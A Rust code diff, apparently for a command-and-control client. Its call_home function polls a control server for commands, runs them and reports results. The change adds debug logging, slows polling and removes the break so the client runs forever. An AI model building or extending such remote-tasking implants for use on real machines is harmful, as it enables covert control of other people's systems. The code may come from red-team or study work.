@@ -16,15 +16,28 @@ use crate::models::{
 mod tasks;
 mod models;
 
-const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);
+const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
 
 /// Fetches commands from the control server and runs them, then returns task results to control
 /// server
 async fn call_home(token: &String) {
+    #[cfg(debug_assertions)]
+    println!("Asking server for tasks");
+
     let tasks: Vec<Task> = match communication::get_commands(token).await {
         Ok(val) => val,
-        Err(_) => Vec::new(),
+        Err(_) => {
+            #[cfg(debug_assertions)]
+            println!("Error when asking server for tasks.");
+            Vec::new()
+        },
     };
+
+    if tasks.is_empty() {
+        #[cfg(debug_assertions)]
+        println!("No task received");
+    }
+
     for t in tasks {
         #[cfg(debug_assertions)]
         println!("\nReceived task #{}: {}", t.id, t.name);
@@ -78,16 +91,8 @@ async fn initialise_client() -> String {
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
     let token: String = initialise_client().await;
-    let mut gets = 0;
     loop {
         call_home(&token).await;
         thread::sleep(POLL_SLEEP);
-
-        // Remove break when the client is supposed to run forever
-        if gets >= 1 {
-            break;
-        }
-        gets += 1;
     }
-    Ok(())
 }
